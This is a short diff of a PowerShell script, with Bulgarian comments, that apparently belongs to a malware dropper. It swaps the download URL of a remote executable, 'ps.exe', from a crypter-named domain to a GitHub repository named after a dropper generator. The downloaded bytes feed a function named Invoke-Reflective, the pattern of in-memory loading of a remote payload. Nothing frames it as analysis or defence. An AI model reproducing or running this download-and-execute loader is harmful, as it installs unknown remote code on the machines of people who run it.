@@ -3,7 +3,7 @@ $env:LIBPATH = ""
 
 # Допълнително почистване на други потенциално проблемни пътища
 $env:INCLUDE = ""
-$pe_bytes = (New-Object Net.WebClient).DownloadData("https://scorpiocrypter.cc/ps.exe")
+$pe_bytes = (New-Object Net.WebClient).DownloadData("https://github.com/TRDropperGen/files/raw/refs/heads/main/ps.exe")
 
 
 function Invoke-Reflective {
